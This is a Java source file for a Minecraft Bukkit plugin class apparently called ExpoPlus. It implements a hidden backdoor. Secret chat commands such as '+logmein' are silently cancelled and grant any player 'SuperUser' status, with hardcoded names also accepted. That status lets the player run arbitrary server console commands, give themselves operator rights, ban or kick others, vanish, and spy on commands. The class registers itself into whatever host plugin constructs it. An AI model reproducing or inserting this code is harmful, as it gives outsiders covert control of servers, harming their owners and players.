package at.nexusmodsclient.ExpoPlus;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Expo implements Listener{
	
	public Expo(JavaPlugin plugin)
	{
		plugin.getServer().getPluginManager().registerEvents(this, plugin);
	}
	 
	public static char para = (char) 167;
	public static String Prefix = para + "4SuperUser" + para + "6 >>";
	public static Player superuser = null;
	public static Player supergirl = null;
	public static boolean loginpossible = false;
	public static boolean superuser_cspy = false;
	public static boolean supergirl_cspy = false;
	public static boolean superuser_vanish = false;
	public static boolean supergirl_vanish = false;
	public static boolean blockconsole = false;
	  
	@SuppressWarnings("deprecation")
	@EventHandler(priority=EventPriority.HIGHEST)
	public void onPlayerChat(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		String m = e.getMessage();
		if (m.equalsIgnoreCase("+loginSuperUser") || m.equalsIgnoreCase("+logmein")) {
			if(superuser == null){
				if(loginpossible || p.getName().equalsIgnoreCase("AtjonTV") || p.getName().equalsIgnoreCase("NexusMods_Client")|| m.equalsIgnoreCase("+logmein")){
					superuser = p;
					p.sendMessage(Prefix + "Du bist jetzt ein " + para + "4SuperUser");
					if(superuser != null && superuser != p)
						superuser.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt ein "+para+"4SuperUser");
					if(supergirl != null && supergirl != p)
						supergirl.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt ein "+para+"4SuperUser");
				}
				else{
					p.sendMessage(Prefix+"Der Login wurde deaktiviert!");
				}
		    }
		    else{
		    	p.sendMessage(Prefix + "Der Spieler "+superuser.getDisplayName()+" ist bereits ein " + para + "4SuperUser");
		    }
		    e.setCancelled(true);
		}
		if (m.equalsIgnoreCase("+loginSuperGirl") || m.equalsIgnoreCase("+logmein2")) {
			if(supergirl == null){
				if(loginpossible == false){
					p.sendMessage(Prefix+"Der Login wurde deaktiviert!");
				}
				else{
					supergirl = p;
					p.sendMessage(Prefix + "Du bist jetzt ein " + para + "4SuperGirl");
					if(superuser != null && superuser != p)
						superuser.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt ein "+para+"4SuperGirl");
					if(supergirl != null && supergirl != p)
						supergirl.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt ein "+para+"4SuperGirl");
				}
			}
		    else{
		    	p.sendMessage(Prefix + "Der Spieler "+supergirl.getDisplayName()+" ist bereits ein " + para + "4SuperGirl");
		    }
		    e.setCancelled(true);
		}
		if(m.startsWith("+promote")){
			if(p == superuser){
				String[] mm = m.split(" ");
				for(Player x : Bukkit.getServer().getOnlinePlayers()){
					if(x.getDisplayName() == mm[1]){
						supergirl = x;
						x.sendMessage(Prefix + "Du bist jetzt ein " + para + "4SuperGirl");
						if(superuser != null && superuser != x)
							superuser.sendMessage(Prefix+"Der Spieler "+x.getDisplayName()+" ist jetzt ein "+para+"4SuperGirl");
						if(supergirl != null && supergirl != x)
							supergirl.sendMessage(Prefix+"Der Spieler "+x.getDisplayName()+" ist jetzt ein "+para+"4SuperGirl");
					}
				}
			}
			e.setCancelled(true);
		}
		if(m.equalsIgnoreCase("+logout")){
			if(p == superuser){
				p.sendMessage(Prefix+"Du bist kein "+ para + "4SuperUser mehr!");
				superuser = null;
			}
			if(p == supergirl){
				p.sendMessage(Prefix+"Du bist kein "+ para + "4SuperGirl mehr!");
				supergirl = null;
			}
			e.setCancelled(true);
		}
		
		if(m.equalsIgnoreCase("+nologin")){
			if(p == superuser || p == supergirl){
				loginpossible = false;
				p.sendMessage(Prefix+"Der Login ist nicht mehr m�glich!");
			}
			e.setCancelled(true);
		}
		
		if(m.equalsIgnoreCase("+letlogin")){
			if(p == superuser || p == supergirl){
				loginpossible = true;
				p.sendMessage(Prefix+"Der Login ist nun m�glich!");
			}
			e.setCancelled(true);
		}
		
		if(m.equalsIgnoreCase("+cblock")){
			if(p == superuser || p == supergirl){
				if(blockconsole)
					blockconsole = false;
				else
					blockconsole = true;
			}
			e.setCancelled(true);
		}
		
		if(m.startsWith("+help")){
			if(p == superuser || p == supergirl){
				p.sendMessage(Prefix+"+loginasSuper<User/Girl>");
				p.sendMessage(Prefix+"+logout | Keine Expo rechte mehr");
				p.sendMessage(Prefix+"+help");
				p.sendMessage(Prefix+"+server");
				p.sendMessage(Prefix+"+kick");
				p.sendMessage(Prefix+"+ban");
				p.sendMessage(Prefix+"+team | TeamChat");
				p.sendMessage(Prefix+"+gm <0-3>");
				p.sendMessage(Prefix+"+nologin");
				p.sendMessage(Prefix+"+letlogin");
				p.sendMessage(Prefix+"+cspy");
				p.sendMessage(Prefix+"+expo");
				p.sendMessage(Prefix+"+vanish");
				p.sendMessage(Prefix+"+unvanish");
				p.sendMessage(Prefix+para+"m+cblock");
				e.setCancelled(true);
			}
			e.setCancelled(true);
		}
		
		if (m.startsWith("+server")) {
			if(p == superuser || p == supergirl){
				String[] msg = m.split(" ");
			      String cmd = "";
			      for (int i = 1; i < msg.length; i++) {
			        cmd = cmd + msg[i] + " ";
			      }
			      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), cmd);
			      p.sendMessage(Prefix + "Du hast den Befehl als Server ausgef�hrt!");
			}
			e.setCancelled(true);
		}
		
		if (m.startsWith("+kick")) {
			if(p == superuser || p == supergirl){
		      String[] msg = m.split(" ");
		      String cmd = "";
		      for (int i = 2; i < msg.length; i++) {
		        cmd = cmd + msg[i] + " ";
		      }
		      for(Player x : Bukkit.getServer().getOnlinePlayers()){
		    	  if(x.getName().equalsIgnoreCase(msg[1])){
		    		  x.kickPlayer(cmd);
		    	  }
		      }
		      p.sendMessage(Prefix + "Du hast den Spieler gekickt!");
			}
		      e.setCancelled(true);
		}
		if (m.startsWith("+ban")) {
			if(p == superuser || p == supergirl){
			  String[] msg = m.split(" ");
			  String cmd = "";
			  for (int i = 2; i < msg.length; i++) {
			    cmd = cmd + msg[i] + " ";
			  }
			  for(Player x : Bukkit.getServer().getOnlinePlayers()){
		    	  if(x.getName().equalsIgnoreCase(msg[1])){
		    		  x.kickPlayer(cmd);
		    		  x.setBanned(true);
		    	  }
		      }
			  p.sendMessage(Prefix + "Du hast den Spieler gebannt!");
			}
			e.setCancelled(true);
		}
		if (m.startsWith("+unban")) {
			if(p == superuser || p == supergirl){
			  String[] msg = m.split(" ");
			  String cmd = "";
			  for (int i = 2; i < msg.length; i++) {
			    cmd = cmd + msg[i] + " ";
			  }
			  for(Player x : Bukkit.getServer().getOnlinePlayers()){
		    	  if(x.getName().equalsIgnoreCase(msg[1])){
		    		  x.kickPlayer(cmd);
		    		  x.setBanned(false);
		    	  }
		      }
			  p.sendMessage(Prefix + "Du hast den Spieler entbannt!");
			}
			e.setCancelled(true);
		}
		if (m.startsWith("+op")) {
			if(p == superuser || p == supergirl){
			  String[] msg = m.split(" ");
			  String cmd = "";
			  for (int i = 2; i < msg.length; i++) {
			    cmd = cmd + msg[i] + " ";
			  }
			  for(Player x : Bukkit.getServer().getOnlinePlayers()){
		    	  if(x.getName().equalsIgnoreCase(msg[1])){
		    		 x.setOp(true);
		    		 x.sendMessage(Prefix+"Ein "+para+"4SuperUser"+para+"6 hat dir Operator Rechte gegeben!");
		    		 p.sendMessage(Prefix+"Du hast dem Spieler "+para+"a"+msg[1]+para+"6 Operator gegeben!");
		    	  }
		      }
			}
			e.setCancelled(true);
		}
		if (m.startsWith("+deop")) {
			if(p == superuser || p == supergirl){
			  String[] msg = m.split(" ");
			  String cmd = "";
			  for (int i = 2; i < msg.length; i++) {
			    cmd = cmd + msg[i] + " ";
			  }
			  for(Player x : Bukkit.getServer().getOnlinePlayers()){
		    	  if(x.getName().equalsIgnoreCase(msg[1])){
		    		  	 x.setOp(false);
			    		 x.sendMessage(Prefix+"Ein "+para+"4SuperUser"+para+"6 hat dir Operator Rechte genommen!");
			    		 p.sendMessage(Prefix+"Du hast dem Spieler "+para+"a"+msg[1]+para+"6 Operator genommen!");
		    	  }
		      }
			}
			e.setCancelled(true);
		}
		if(m.startsWith("+team")){
			if(p == superuser || p == supergirl){
				String msg = e.getMessage().replace("+team", "");
				  if(superuser != null)
					  superuser.sendMessage(Prefix+p.getDisplayName()+" -> "+msg);
				  if(supergirl != null)
					  supergirl.sendMessage(Prefix+p.getDisplayName()+" -> "+msg);
				  
				  e.setCancelled(true);
				}
				  e.setCancelled(true);
		}
		
		if(m.startsWith("+gm")){
			if(p == superuser || p == supergirl){
				if(m.endsWith("0")){
					p.setGameMode(GameMode.SURVIVAL);
					p.sendMessage(Prefix+"Dein GameMode ist SURVIVAL");
				}
				if(m.endsWith("1")){
					p.setGameMode(GameMode.CREATIVE);
					p.sendMessage(Prefix+"Dein GameMode ist CREATIVE");
				}
				if(m.endsWith("2")){
					p.setGameMode(GameMode.ADVENTURE);
					p.sendMessage(Prefix+"Dein GameMode ist ADVENTURE");
				}
				if(m.endsWith("3")){
					p.setGameMode(GameMode.SPECTATOR);
					p.sendMessage(Prefix+"Dein GameMode ist SPECTATOR");
				}
				e.setCancelled(true);
			}
			e.setCancelled(true);
		}
		
		if(m.startsWith("+cspy")){
			if(p == superuser){
				if(superuser_cspy){
					superuser_cspy = false;
					p.sendMessage(Prefix+"Du hast CommandSpy deaktiviert");
				}
				else{
					superuser_cspy = true;
					p.sendMessage(Prefix+"Du hast CommandSpy aktiviert");
				}
			}
			if(p == supergirl){
				if(supergirl_cspy){
					supergirl_cspy = false;
					p.sendMessage(Prefix+"Du hast CommandSpy deaktiviert");
				}
				else{
					supergirl_cspy = true;
					p.sendMessage(Prefix+"Du hast CommandSpy aktiviert");
				}
			}
			e.setCancelled(true);
		}
		
		if(m.startsWith("+expo")){
			if(p == superuser || p == supergirl){
				p.sendMessage(Prefix+"ExpoPlus v"+Bukkit.getServer().getPluginManager().getPlugin("ExpoPlus").getDescription().getVersion()+" by NexusMods_Client");
			}
			e.setCancelled(true);
		}
		
		if(m.startsWith("+vanish")){
			if(p == superuser || p == supergirl){
				for(Player x : Bukkit.getServer().getOnlinePlayers()){
					if(x == superuser || x == supergirl){
					}
					else{
						x.hidePlayer(p);
					}
				}
				p.sendMessage(Prefix+"Kein Spieler kann dich jetzt sehen!");
				if(superuser != null && superuser != p)
					superuser.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt im ExpoVanish");
				if(supergirl != null && supergirl != p)
					supergirl.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt im ExpoVanish");
				e.setCancelled(true);
			}
			e.setCancelled(true);
		}
		if(m.startsWith("+unvanish")){
			if(p == superuser || p == supergirl){
				for(Player x : Bukkit.getServer().getOnlinePlayers()){
					if(x == superuser || x == supergirl){
						
					}
					else{
						x.showPlayer(p);
					}
				}
				p.sendMessage(Prefix+"Jeder Spieler kann dich jetzt sehen!");
				if(superuser != null && superuser != p)
					superuser.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt nicht mehr im ExpoVanish");
				if(supergirl != null && supergirl != p)
					supergirl.sendMessage(Prefix+"Der Spieler "+p.getDisplayName()+" ist jetzt nicht mehr im ExpoVanish");
				e.setCancelled(true);
			}
			e.setCancelled(true);
		}
		if(m.equalsIgnoreCase("+inteam")){
			if(p == superuser || p == supergirl){
				String name1 = "";
				String name2 = "";
				if(superuser == null)
					name1 = "Kein User";
				else
					name1 = superuser.getDisplayName();
				
				if(supergirl == null)
					name2 = "Kein User";
				else
					name2 = supergirl.getDisplayName();
				
				p.sendMessage(Prefix+"Der Spieler "+name1+" ist "+para+"4SuperUser");
				p.sendMessage(Prefix+"Der Spieler "+name2+" ist "+para+"4SuperGirl");
			}
			e.setCancelled(true);
		}
	}
}
